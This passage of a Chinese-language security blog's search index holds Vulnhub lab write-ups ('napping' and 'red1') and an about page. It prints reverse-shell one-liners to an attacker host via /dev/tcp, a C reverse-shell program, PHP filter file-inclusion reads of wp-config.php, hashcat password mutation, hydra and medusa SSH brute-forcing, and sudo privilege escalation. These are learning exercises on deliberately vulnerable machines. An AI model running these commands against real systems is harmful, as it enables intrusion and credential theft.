class="hljs-string">&#x27;http://192.168.1.15&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008123855027.png" alt="image-20231008123855027"></p></li><li><p>ok，成功拿到管理员账号密码，我们尝试ssh登录，成功</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> daniel@<span class="hljs-number">192.168.1.33</span><br>password=C<span class="hljs-variable">@ughtm3napping123</span><br></code></pre></td></tr></table></figure><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008131000426.png" alt="image-20231008131000426"></p></li><li><p>接下来开始提权，sudo被禁用，查看可执行文件，发现在&#x2F;home&#x2F;adrian&#x2F;下存在一个py脚本文件，内容大概是记录日志，我们可以直接修改，查看日志发现两分钟执行一次，我们修改脚本代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;/usr/bin/bash -c &#x27;/usr/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.15/8888&#x27; 0&gt;&amp;1&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>同时在kali(192.168.1.15)监听8888端口，过了两分钟，成功拿到adrian的shell<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008133315836.png" alt="image-20231008133315836"></p></li><li><p>接下来利用adrian提权，查看sudo -l<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008133359694.png" alt="image-20231008133359694"></p></li><li><p>ok ，sudo vim提权<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231008133645461.png" class title="image-20231008133645461"></p></li></ol><h3 id="red1"><a href="#red1" class="headerlink" title="red1"></a>red1</h3><ol><li><p>扫ip，端口发现，开放了22，80；其中80端口运行wordpress</p></li><li><p>dirb扫目录，同时自己点进主页查看，发现存在一个域名 <code>redrocks.win</code> ，修改hosts文件将域名地址导向<code>192.168.448.135</code> </p></li><li><p>咱们做两手准备，一方面用wpscan扫漏洞和爆破用户名密码，发现用户 <code>administrator</code> ，用rockyou字典进行密码爆破；另一方面读网页源码，发现提示 <code>Mr.miessler</code> ，经过搜索发现有个相关github项目中有php后门字典，我们利用 <code>dirb</code> 发现一个php后门 <code> /NetworkFileManagerPHP.php</code></p></li><li><p>访问 <code> /NetworkFileManagerPHP.php</code> 无回显，利用 <code>ffuf</code> 尝试爆破参数</p><p>（这个过程中由于请求过快，导致靶机崩溃了，尝试了好几次都有问题😂）<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019145058250.png" alt="image-20231019145058250"></p></li><li><p>改用burp来爆破参数，这里用的字典<code>D:\tools\fuzzDicts-master\paramDict\parameter.txt</code><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019154450410.png" alt="image-20231019154450410"></p></li><li><p>接下来测试这个后门是什么功能，已经输入的命令 <code>ls</code> ，无效，尝试输入一个文件地址 <code>/etc/passwd</code> ，很好，任意文件读取<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019154846474.png" alt="image-20231019154846474"></p></li><li><p>我们来测试一下是不是文件包含漏洞，使用</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?<span class="hljs-built_in">key</span>=php://filter/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=NetworkFileManagerPHP.php<br></code></pre></td></tr></table></figure><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019155326248.png" alt="image-20231019155326248"></p></li><li><p>那好办了，解码后看看有没有过滤<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019155445880.png" alt="image-20231019155445880"></p></li><li><p>有点东西，虽然没有过滤，但是还有个注释，我们再解码一次</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw</span>==<br>That password alone won<span class="hljs-string">&#x27;t help you! Hashcat says rules are rules</span><br></code></pre></td></tr></table></figure></li><li><p>读取wp-config.php</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=wp-config.php<br></code></pre></td></tr></table></figure><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019161033785.png" alt="image-20231019161033785"></p><p>拿到账号 <code>john</code> 密码 <code>R3v_m4lwh3r3_k1nG!!</code>，直接尝试ssh，失败，密码错误</p></li><li><p>之前的注释提示要用hashcat的rule，我们bing一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">先将我们的密码放进一个base.txt文件，然后运行以下指令<br>hashcat <span class="hljs-attr">--stdout</span> base<span class="hljs-selector-class">.txt</span> -r /usr/share/hashcat/rules/best64<span class="hljs-selector-class">.rule</span> -o password.txt<br></code></pre></td></tr></table></figure><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019161907131.png" alt="image-20231019161907131"></p></li><li><p>接下来我们用九头蛇或者美杜莎进行ssh爆破</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">九头蛇：<br>hydra -l john -P password<span class="hljs-selector-class">.txt</span> ssh:<span class="hljs-comment">//192.168.48.135</span><br>美杜莎：<br>medusa -h <span class="hljs-number">192.168</span>.<span class="hljs-number">48.135</span> -u john -P password<span class="hljs-selector-class">.txt</span> -M ssh<br></code></pre></td></tr></table></figure><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019162547602.png" alt="image-20231019162547602"></p><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231019162610010.png" alt="image-20231019162610010"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> john@<span class="hljs-number">192.168.48.135</span><br><span class="hljs-attribute">R3v_m4lwh3r3_k1nG</span>!!<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ol><li><p>ssh登录成功，但是刚连上就被踢掉了<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162750514.png" class title="image-20231019162750514"></p></li><li><p>我们重新爆破，发现密码已经被改<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019162857617.png" class title="image-20231019162857617"></p></li><li><p>再次尝试ssh连接，发现了一张给蓝队的小纸条，告诉我们<code>cat</code> 指令有问题(早就发现了，cat和vim互换)，同时 <code>sudo -l</code> 发现用户 <code>ippsec</code>可执行命令<code>usr/bin/time</code><img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019163337680.png" class title="image-20231019163337680"></p></li><li><p>利用其他用户命令执行和<code>time</code> 指令提权，可以跳转到 <code>ippsec</code> 用户</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -u ippsec <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/time /</span>bin/sh<br></code></pre></td></tr></table></figure><img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231019164601120.png" class title="image-20231019164601120"></li><li><p>这里发现切换用户后仍然会断开连接，于是返回上一步，直接反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> -u ippsec /bin/time /bin/sh -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.48.129</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>同时kali监听8888端口，成功拿到 <code>ippsec</code> 用户的shell且不会断开，利用python拿到交互式命令行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>到这一步没什么思路了，尝试上传提权脚本也提示无权限，经过搜索发现 <code>ippsec</code> 用户在 <code>/var/www/wordpress/.git</code> 目录下具有可写权限，于是我们在该目录尝试上传脏牛内核提权脚本，失败了，但是在该目录下发现了另一个c语言文件<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020131018436.png" class title="image-20231020131018436"></p></li><li><p>似乎是用来踢下线前警告的程序，猜测是root身份运行的，修改内容为反弹shell的c代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dirent.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br> <br><span class="hljs-type">int</span> tcp_port = <span class="hljs-number">7777</span>;<br><span class="hljs-type">char</span> *ip = <span class="hljs-string">&quot;192.168.1.1&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rev_shell</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-type">int</span> fd;<br>        <span class="hljs-keyword">if</span> ( fork() &lt;= <span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> addr;<br>                addr.sin_family = AF_INET;<br>                addr.sin_port = <span class="hljs-built_in">htons</span>(tcp_port);<br>                addr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(ip);<br> <br>                fd = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">connect</span>(fd, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;addr, <span class="hljs-built_in">sizeof</span>(addr)) )&#123;<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                &#125;<br> <br>                <span class="hljs-built_in">dup2</span>(fd, <span class="hljs-number">0</span>);<br>                <span class="hljs-comment">//dup2(fd, 1);</span><br>                <span class="hljs-comment">//dup2(fd, 2);</span><br>                <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-built_in">rev_shell</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>可惜这个代码反弹的shell只能执行命令不能看到回显，只能重新弹一个<img src="/.io//11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231020133345647.png" class title="image-20231020133345647"></p></li></ol><p>拿下</p>]]></content>
    
    
    
    <tags>
      
      <tag>解题记录</tag>
      
      <tag>vulnhub</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>Hello everyone, here’s <strong>greed</strong> 🤗.</p><p>welcome to my blog and thanks for your views 😀 .</p><p>My records include but are not limited to the following: </p><ul><li>CTF writeup(web)</li><li>Cyber Range(like Vulnhub)</li><li>Study notes</li><li>small knowledge points encountered</li><li>…</li></ul><p>Thanks to the technical support provided by the following websites:</p><ul><li><a href="https://hexo.io/zh-cn/">Hexo</a></li><li><a href="https://github.com/fluid-dev/hexo-theme-fluid">fluid-dev&#x2F;hexo-theme-fluid: :ocean:</a></li><li><a href="https://waline.js.org/">Waline评论系统</a></li><li><a href="https://hitokoto.cn/">一言</a></li><li><a href="https://busuanzi.ibruce.info/">不蒜子 - 极简网页计数器</a></li></ul><!-- That's all, thanks again. -->]]></content>
    
  </entry>
  
  
  
</search>
